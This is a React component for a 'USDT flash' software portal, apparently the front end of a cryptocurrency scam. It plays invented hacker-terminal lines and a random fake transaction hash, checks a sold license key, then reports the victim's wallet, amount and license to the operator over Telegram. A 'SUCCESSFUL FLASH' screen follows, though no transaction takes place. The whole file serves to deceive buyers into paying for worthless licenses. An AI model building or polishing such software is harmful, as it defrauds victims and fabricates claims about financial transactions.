import React, { useState, useEffect, useRef } from 'react';
import { Product, SoftwareStage } from '../types.ts';
import { validateLicenseKey, markKeyAsUsed } from '../services/licenseService.ts';
import { sendTelegramNotification } from '../services/telegramService.ts';

interface SoftwarePortalProps {
  product: Product;
  onClose: () => void;
  onPurchaseRequest: () => void;
}

const SoftwarePortal: React.FC<SoftwarePortalProps> = ({ product, onClose, onPurchaseRequest }) => {
  const [stage, setStage] = useState<SoftwareStage>('BOOT');
  const [license, setLicense] = useState('');
  const [wallet, setWallet] = useState('');
  const [amount, setAmount] = useState('');
  const [error, setError] = useState('');
  const [logs, setLogs] = useState<string[]>([]);
  const logEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (stage === 'BOOT') {
      const bootLines = [
        `> INITIALIZING ${product.name} CORE V${product.version}...`,
        "> LOADING DIMENSIONAL TUNNELLING PROTOCOLS...",
        "> ESTABLISHING HANDSHAKE WITH FOREST NODES...",
        "> QUANTUM ENCRYPTION: SECURED [AES-Q-512]",
        "> AWAITING LICENSE VERIFICATION..."
      ];
      let i = 0;
      const interval = setInterval(() => {
        if (i < bootLines.length) {
          setLogs(prev => [...prev, bootLines[i]]);
          i++;
        } else {
          clearInterval(interval);
          setTimeout(() => setStage('LICENSE'), 800);
        }
      }, 300);
      return () => clearInterval(interval);
    }
  }, [stage, product.name, product.version]);

  useEffect(() => {
    if (stage === 'EXECUTING') {
      const executionLines = [
        `> SYNCING WITH TARGET WALLET: ${wallet.slice(0,6)}...${wallet.slice(-4)}`,
        `> PREPARING ${amount} USDT FLASH PACKET...`,
        "> BYPASSING NODE DETECTION ALGORITHMS...",
        "> OPENING DIMENSIONAL RIFT...",
        "> INJECTING LIQUIDITY STREAM...",
        "> HASH: 0X" + Math.random().toString(16).slice(2, 12).toUpperCase(),
        "> TUNNELING THROUGH BLOCK 21.092.11...",
        "> OBFUSCATING TRANSACTION TRACES...",
        "> FINALIZING QUANTUM FLASH..."
      ];
      let i = 0;
      const interval = setInterval(() => {
        if (i < executionLines.length) {
          setLogs(prev => [...prev, executionLines[i]]);
          i++;
        } else {
          clearInterval(interval);
          setTimeout(() => setStage('COMPLETE'), 1500);
        }
      }, 600);
      return () => clearInterval(interval);
    }
  }, [stage, wallet, amount]);

  useEffect(() => {
    logEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [logs]);

  const handleLicenseSubmit = () => {
    if (validateLicenseKey(license)) {
      setStage('CONFIG');
      setError('');
      setLogs(prev => [...prev, `> LICENSE VALIDATED: [${license}]`]);
    } else {
      setError('INVALID OR EXPIRED QUANTUM SIGNATURE');
      setLogs(prev => [...prev, `> ERROR: AUTHENTICATION FAILED FOR SIGNATURE ${license}`]);
    }
  };

  const handleFlashSubmit = async () => {
    if (!wallet || !amount) {
      setError('REQUIRED FIELDS MISSING');
      return;
    }
    setError('');
    setStage('EXECUTING');
    
    markKeyAsUsed(license);

    await sendTelegramNotification({
      product: product.name,
      wallet,
      amount,
      license
    });
  };

  return (
    <div className="fixed inset-0 z-[1000] flex items-center justify-center bg-black/90 backdrop-blur-xl p-4 md:p-8">
      <div className="w-full max-w-4xl glass-panel rounded-[2rem] border-2 border-[#0aff0a]/30 shadow-[0_0_80px_rgba(10,255,10,0.15)] overflow-hidden flex flex-col h-full max-h-[90vh] animate-fade-in">
        {/* Terminal Header */}
        <div className="p-5 bg-[#0a1a0a] border-b border-[#0aff0a]/20 flex justify-between items-center">
          <div className="flex items-center gap-4">
            <div className="flex gap-2">
              <div className="w-3 h-3 rounded-full bg-red-500/40"></div>
              <div className="w-3 h-3 rounded-full bg-yellow-500/40"></div>
              <div className="w-3 h-3 rounded-full bg-[#0aff0a] animate-pulse"></div>
            </div>
            <span className="font-mono text-[10px] font-black text-[#0aff0a]/70 uppercase tracking-[0.2em]">
              root@elon-core:/{product.id}/quantum_flash
            </span>
          </div>
          <button onClick={onClose} className="text-white/40 hover:text-red-500 transition-colors">
            <i className="fas fa-times-circle text-xl"></i>
          </button>
        </div>

        {/* Output Console */}
        <div className="flex-1 overflow-y-auto p-6 md:p-10 font-mono text-xs md:text-sm text-[#0aff0a] space-y-3 bg-black/60 scroll-smooth">
          {logs.map((log, i) => (
            <div key={i} className="flex gap-4 opacity-90 animate-fade-in">
              <span className="opacity-30 flex-shrink-0">[{new Date().toLocaleTimeString([], { hour12: false })}]</span>
              <span className="leading-relaxed">{log}</span>
            </div>
          ))}
          <div ref={logEndRef} />
          
          {stage === 'LICENSE' && (
            <div className="mt-8 p-6 md:p-10 bg-[#0aff0a]/5 border border-[#0aff0a]/20 rounded-3xl animate-fade-in space-y-6">
              <h4 className="font-orbitron font-black text-xl text-center tracking-widest text-[#0aff0a]">LICENSE AUTHENTICATION</h4>
              <div className="flex flex-col md:flex-row gap-4">
                <input
                  type="text"
                  placeholder="ENTER QUANTUM KEY"
                  value={license}
                  onChange={(e) => setLicense(e.target.value.toUpperCase())}
                  className="flex-1 bg-black/60 border border-[#0aff0a]/30 rounded-xl px-5 py-4 text-center text-lg font-bold tracking-[0.2em] text-[#0aff0a] outline-none focus:border-[#0aff0a] focus:ring-1 focus:ring-[#0aff0a]/50 transition-all"
                />
                <button 
                  onClick={handleLicenseSubmit}
                  className="px-10 bg-[#0aff0a] text-black font-black uppercase rounded-xl hover:bg-[#00ffaa] active:scale-95 transition-all shadow-[0_0_20px_rgba(10,255,10,0.3)]"
                >
                  VALIDATE
                </button>
              </div>
              <div className="flex justify-center">
                <button 
                  onClick={onPurchaseRequest}
                  className="text-[10px] text-[#0aff0a]/60 hover:text-[#0aff0a] font-bold uppercase tracking-widest transition-colors"
                >
                  Need a license? Acquire one from Marketplace
                </button>
              </div>
              {error && <p className="text-red-500 font-bold text-center text-[10px] animate-pulse uppercase tracking-widest">{error}</p>}
            </div>
          )}

          {stage === 'CONFIG' && (
            <div className="mt-8 p-6 md:p-10 bg-[#0aff0a]/5 border border-[#0aff0a]/20 rounded-3xl animate-fade-in space-y-8">
              <div className="text-center space-y-2">
                <h4 className="font-orbitron font-black text-xl tracking-widest text-[#0aff0a]">FLASH PARAMETERS</h4>
                <p className="text-[10px] text-[#0aff0a]/40 uppercase tracking-widest">Authorized Session: {license}</p>
              </div>
              
              <div className="space-y-6 max-w-xl mx-auto">
                <div className="space-y-3">
                  <label className="text-[10px] font-black uppercase tracking-[0.2em] text-[#0aff0a]/60">Destination Wallet (TRC20 / ERC20)</label>
                  <input
                    type="text"
                    placeholder="0x..."
                    value={wallet}
                    onChange={(e) => setWallet(e.target.value)}
                    className="w-full bg-black/80 border border-[#0aff0a]/30 rounded-xl px-5 py-4 font-mono text-[#0aff0a] outline-none focus:border-[#0aff0a] transition-all"
                  />
                </div>
                <div className="space-y-3">
                  <label className="text-[10px] font-black uppercase tracking-[0.2em] text-[#0aff0a]/60">Amount to Flash (USDT)</label>
                  <input
                    type="number"
                    placeholder="0.00"
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    className="w-full bg-black/80 border border-[#0aff0a]/30 rounded-xl px-5 py-4 font-mono text-[#0aff0a] outline-none focus:border-[#0aff0a] transition-all"
                  />
                </div>
              </div>

              {error && <p className="text-red-500 font-bold text-center text-[10px] animate-pulse uppercase tracking-widest">{error}</p>}

              <button 
                onClick={handleFlashSubmit}
                className="w-full max-w-xl mx-auto py-5 bg-[#0aff0a] text-black font-black uppercase rounded-xl hover:bg-[#00ffaa] shadow-[0_10px_40px_rgba(10,255,10,0.3)] active:scale-[0.98] transition-all flex items-center justify-center gap-3"
              >
                <i className="fas fa-bolt"></i> INITIATE QUANTUM FLASH
              </button>
            </div>
          )}

          {stage === 'EXECUTING' && (
            <div className="fixed inset-0 z-[1100] flex flex-col items-center justify-center pointer-events-none bg-black/40">
               <div className="glass-panel p-12 rounded-full border-2 border-[#0aff0a] animate-pulse shadow-[0_0_120px_rgba(10,255,10,0.4)] bg-black/60">
                 <i className="fas fa-satellite-dish text-6xl text-[#0aff0a]"></i>
               </div>
               <div className="mt-10 text-center space-y-4 bg-black/90 p-8 rounded-3xl border border-[#0aff0a]/20 backdrop-blur-md">
                 <h2 className="font-orbitron font-black text-2xl text-[#0aff0a] tracking-widest">FLASH IN PROGRESS</h2>
                 <p className="text-xs text-[#b0ffb0] animate-pulse font-mono">NEURAL HANDSHAKE ACTIVE. DO NOT DISCONNECT.</p>
                 <div className="w-full bg-white/5 h-1 rounded-full overflow-hidden">
                    <div className="bg-[#0aff0a] h-full animate-[progress_10s_linear_infinite]" style={{ width: '40%' }}></div>
                 </div>
               </div>
            </div>
          )}

          {stage === 'COMPLETE' && (
            <div className="mt-8 p-12 text-center space-y-10 animate-fade-in">
              <div className="w-32 h-32 bg-[#0aff0a] text-black rounded-[2.5rem] flex items-center justify-center mx-auto shadow-[0_0_60px_rgba(10,255,10,0.6)] rotate-6">
                <i className="fas fa-check-double text-5xl"></i>
              </div>
              <div className="space-y-4">
                <h3 className="font-orbitron text-4xl font-black text-[#0aff0a] tracking-tighter">SUCCESSFUL FLASH</h3>
                <p className="text-sm text-[#b0ffb0]/70 max-w-md mx-auto leading-relaxed">Liquidity has been successfully tunneled into the target node. Transaction hash is propagating across the Forest network.</p>
              </div>
              <button 
                onClick={onClose}
                className="w-full max-w-xs mx-auto py-5 border-2 border-[#0aff0a] text-[#0aff0a] font-black uppercase rounded-2xl hover:bg-[#0aff0a] hover:text-black transition-all shadow-[0_0_20px_rgba(10,255,10,0.1)]"
              >
                DISCONNECT TERMINAL
              </button>
            </div>
          )}
        </div>
      </div>
      <style>{`
        @keyframes progress {
          0% { width: 0%; }
          100% { width: 100%; }
        }
      `}</style>
    </div>
  );
};

export default SoftwarePortal;